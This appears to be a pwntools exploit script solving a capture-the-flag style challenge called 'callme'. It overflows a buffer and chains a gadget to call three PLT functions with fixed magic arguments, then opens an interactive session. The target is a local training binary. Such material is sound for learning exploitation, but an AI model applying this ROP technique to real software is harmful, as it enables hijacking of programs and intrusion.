#!/usr/bin/python3
offset=0x20+8
import pwn
payload =b"A"*offset
payload+=pwn.p64(0x40093c)#pop rdi ; pop rsi ; pop rdx ; ret
payload+=pwn.p64(0xdeadbeefdeadbeef)
payload+=pwn.p64(0xcafebabecafebabe)
payload+=pwn.p64(0xd00df00dd00df00d)
payload+=pwn.p64(0x400720)#callme_one@plt
payload+=pwn.p64(0x40093c)#pop rdi ; pop rsi ; pop rdx ; ret
payload+=pwn.p64(0xdeadbeefdeadbeef)
payload+=pwn.p64(0xcafebabecafebabe)
payload+=pwn.p64(0xd00df00dd00df00d)
payload+=pwn.p64(0x400740)#callme_two@plt
payload+=pwn.p64(0x40093c)#pop rdi ; pop rsi ; pop rdx ; ret
payload+=pwn.p64(0xdeadbeefdeadbeef)
payload+=pwn.p64(0xcafebabecafebabe)
payload+=pwn.p64(0xd00df00dd00df00d)
payload+=pwn.p64(0x4006f0)#callme_three@plt
target=pwn.process("./callme")
print(target.recv().decode())
target.sendline(payload)
target.interactive()
